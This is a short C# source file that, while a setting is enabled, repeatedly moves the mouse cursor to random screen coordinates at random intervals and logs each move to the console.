using System.ComponentModel;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class MoveCursorAction
{
    public static void Follow(object? sender, DoWorkEventArgs doWorkEventArgs)
    {
        while (Settings.CursorRandom)
        {
            Random random = new();
            var randomX = random.Next(-1000, 1000);
            var randomY = random.Next(-1000, 1000);

            Thread.Sleep(random.Next(Settings.CursorMinTime, Settings.CursorMaxTime));
            Task.Run(() => HookStatement.SetCursorPos(randomX, randomY));
            Console.WriteLine($"\t[CURRENT SESSION LOG] Cursor moved to X: {randomX} Y: {randomY}");
        }
    }
}
